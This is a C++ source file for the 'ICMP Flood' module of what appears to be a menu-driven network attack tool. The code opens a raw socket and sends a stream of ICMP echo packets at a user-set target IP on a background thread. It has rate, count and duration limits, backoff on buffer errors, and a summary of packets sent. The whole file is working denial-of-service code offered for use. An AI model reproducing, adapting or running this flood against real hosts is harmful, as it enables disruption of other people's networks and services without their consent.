#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <cerrno>
#include <chrono>
#include <thread>

#include "../headers/icmp.h"

ICMP::ICMP(Mode mode)
    : packet_count(3000),
      max_duration_seconds(30),
      packets_per_second(100),
      enobufs_backoff_ms(50),
      current_mode(mode),
      stop_flag(false) {}

ICMP::~ICMP() {
    stop();
}

std::string ICMP::get_name() {
    return "ICMP Flood";
}

void ICMP::stop() {
    stop_flag = true;
    if (attack_thread.joinable()) {
        attack_thread.join();
    }
    //std::cout << get_name() << " stopped." << std::endl;
}

void ICMP::run(Session* session) {
    if (session->target_ip.empty()) {
        std::cerr << C_YELLOW << "Target IP is not set. Please configure it in the main menu." << C_RESET << std::endl;
        return;
    }
    stop_flag = false;
    attack_thread = std::thread(&ICMP::flood_loop, this, session->target_ip);
    //std::cout << C_BOLD << get_name() << " started..." << C_RESET << std::endl;
}

void ICMP::flood_loop(std::string target_ip_str) {
    const char* target_ip = target_ip_str.c_str();

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP flood_loop socket creation failed");
        return;
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip, &dest.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        return;
    }

    char packet[sizeof(struct icmphdr) + 64];
    memset(packet, 0, sizeof(packet));

    struct icmphdr* icmp = (struct icmphdr*)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(rand() % 65535);
    memset(packet + sizeof(struct icmphdr), 'A', 64);

    long attempted_packets = 0;
    long sent_packets = 0;
    long failed_packets = 0;
    long enobufs_count = 0;

    const int effective_packets_per_second = packets_per_second > 0 ? packets_per_second : 1;
    const int effective_enobufs_backoff_ms = enobufs_backoff_ms > 0 ? enobufs_backoff_ms : 1;
    const auto start_time = std::chrono::steady_clock::now();
    auto next_send_time = start_time;
    auto last_error_log = start_time - std::chrono::seconds(1);
    const auto send_interval = std::chrono::microseconds(1000000 / effective_packets_per_second);
    std::string stop_reason = "stopped by user";

    while (!stop_flag) {
        const auto now = std::chrono::steady_clock::now();
        if (max_duration_seconds > 0 &&
            now - start_time >= std::chrono::seconds(max_duration_seconds)) {
            stop_reason = "max duration reached";
            break;
        }
        if (packet_count > 0 && attempted_packets >= packet_count) {
            stop_reason = "max packet count reached";
            break;
        }

        if (now < next_send_time) {
            std::this_thread::sleep_until(next_send_time);
        }
        if (stop_flag) {
            break;
        }
        next_send_time += send_interval;

        icmp->un.echo.sequence = htons(attempted_packets);
        icmp->checksum = 0;
        icmp->checksum = checksum(packet, sizeof(packet));

        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            int saved_errno = errno;
            failed_packets++;
            if (saved_errno == ENOBUFS) {
                enobufs_count++;
                std::this_thread::sleep_for(std::chrono::milliseconds(effective_enobufs_backoff_ms));
            }

            const auto error_now = std::chrono::steady_clock::now();
            if (error_now - last_error_log >= std::chrono::seconds(1)) {
                std::cerr << C_YELLOW << "[!] ICMP send failed: "
                          << std::strerror(saved_errno)
                          << " (further errors are rate-limited)" << C_RESET << std::endl;
                last_error_log = error_now;
            }
        } else {
            sent_packets++;
        }

        attempted_packets++;
    }

    close(sock);

    const auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start_time).count();
    std::cout << C_GREEN << "[+] ICMP Flood stopped (" << stop_reason << "). "
              << "Attempted: " << attempted_packets
              << ", sent: " << sent_packets
              << ", failed: " << failed_packets
              << ", ENOBUFS: " << enobufs_count
              << ", elapsed: " << (elapsed_ms / 1000.0) << "s"
              << C_RESET << std::endl;
}

unsigned short ICMP::checksum(void* b, int len) {
    unsigned short* buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}
